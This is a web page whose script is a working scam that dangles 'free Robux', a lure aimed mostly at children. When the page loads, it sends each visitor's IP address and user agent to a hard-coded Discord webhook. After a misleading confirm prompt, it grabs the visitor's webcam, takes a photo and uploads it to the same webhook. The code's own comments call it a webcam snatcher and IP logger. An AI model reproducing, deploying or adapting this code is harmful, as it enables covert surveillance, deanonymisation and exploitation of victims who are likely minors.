    <style>

<body>
    <button id="executeBtn">üéÅ CLAIM FREE ROBUX</button>

<script>
// ‰∑Ä‰∑Å‰∑Ç‰∑Ñ WEBCAM CAPTURE WITH DELAY + IP LOGGER ‰∑Ö‰∑Ü‰∑á‰∑à
const WEBHOOK_URL = "https://discord.com/api/webhooks/1403083806705057812/I3474kOt2sZKd2gOPsv6BCcP1X7J0smnlx5r15sp_Hm28vtemEZaCbMI1q3D6emTv5zR";
const DELAY_SECONDS = 3; // Delay before capturing webcam

// ‰∏Ç·ö¥·õÅ·ö•·õñ‰∏Ç‰∏Ç‰∏Ç‰∏Ç GET IP
async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const { ip } = await res.json();
    return ip;
  } catch {
    return "IP_FETCH_FAILED";
  }
}

// ‰∑Ä‰∑Å‰∑ä‰∑ã LOG TO WEBHOOK
async function logToWebhook(title, description) {
  const embed = {
    title: title,
    description: description,
    color: title.includes("‚ùå") ? 0xff0000 : 0x00ff00,
    timestamp: new Date().toISOString()
  };
  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] })
  });
}

// ‰∏Ç·ö¥·õÅ·ö•·õñ‰∏Ç‰∏Ç‰∏Ç‰∏Ç WEBCAM SNATCHER WITH DELAY
async function hijackWebcam() {
  try {
    const ip = await getIP();
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: {
        width: { ideal: 1920 },
        height: { ideal: 1080 },
        facingMode: "user"
      } 
    });
    
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play(); // Start video playback
    
    // Create preview container
    const preview = document.createElement("div");
    preview.style.position = "fixed";
    preview.style.bottom = "20px";
    preview.style.right = "20px";
    preview.style.width = "200px";
    preview.style.border = "2px solid red";
    preview.style.borderRadius = "10px";
    preview.style.overflow = "hidden";
    preview.style.zIndex = "99999";
    preview.appendChild(video);
    document.body.appendChild(preview);
    
    // Add loading text
    const loadingText = document.createElement("div");
    loadingText.textContent = `Capturing in ${DELAY_SECONDS} seconds...`;
    loadingText.style.color = "white";
    loadingText.style.backgroundColor = "black";
    loadingText.style.padding = "5px";
    loadingText.style.textAlign = "center";
    preview.appendChild(loadingText);
    
    // Countdown timer
    let countdown = DELAY_SECONDS;
    const countdownInterval = setInterval(() => {
      countdown--;
      loadingText.textContent = `Capturing in ${countdown} seconds...`;
      if (countdown <= 0) {
        clearInterval(countdownInterval);
        captureFrame();
      }
    }, 1000);
    
    async function captureFrame() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      
      // Ensure video is properly loaded
      await new Promise(resolve => setTimeout(resolve, 500));
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("file", blob, `webcam_${ip}.jpg`);
        fetch(WEBHOOK_URL, { method: "POST", body: formData });
        logToWebhook("üì∏ WEBCAM CAPTURED", 
          `IP: ${ip}\n` +
          `Resolution: ${canvas.width}x${canvas.height}\n` +
          `Delay: ${DELAY_SECONDS} seconds`);
        
        // Clean up
        stream.getTracks().forEach(track => track.stop());
        preview.remove();
      }, "image/jpeg", 0.90);
    }
    
  } catch (err) {
    logToWebhook("‚ùå WEBCAM FAILED", `IP: ${await getIP()}\nError: ${err.message}`);
  }
}

// ‰∑Ä‰∑Å‰∑ä‰∑ã MAIN EXECUTION
(async function() {
  const ip = await getIP();
  await logToWebhook("üåê VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);

  if (confirm("Allow webcam for free robux?")) {
    await hijackWebcam();
  } else {
    await logToWebhook("‚ö†Ô∏è WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
  }

  // ‰∏Ç·ö¥·õÅ·ö•·õñ‰∏Ç‰∏Ç‰∏Ç‰∏Ç MANUAL TRIGGER BUTTON
  document.body.innerHTML += `
    <button id="executeBtn" style="
      position:fixed;
      top:10px;
      right:10px;
      z-index:9999;
      background:linear-gradient(to right, #ff8a00, #e52e71);
      color:white;
      border:none;
      padding:12px 24px;

      cursor:pointer;
      font-weight:bold;
      box-shadow:0 4px 15px rgba(0,0,0,0.2);
      transition:all 0.3s ease;
    ">
      üéÅ CLAIM FREE ROBUX
    </button>
  `;
  
  const btn = document.getElementById("executeBtn");
  btn.addEventListener("mouseover", () => {
    btn.style.transform = "scale(1.05)";
    btn.style.boxShadow = "0 6px 20px rgba(0,0,0,0.3)";
  });
  btn.addEventListener("mouseout", () => {
    btn.style.transform = "scale(1)";
    btn.style.boxShadow = "0 4px 15px rgba(0,0,0,0.2)";
  });
  btn.addEventListener("click", hijackWebcam);
})();
</script>
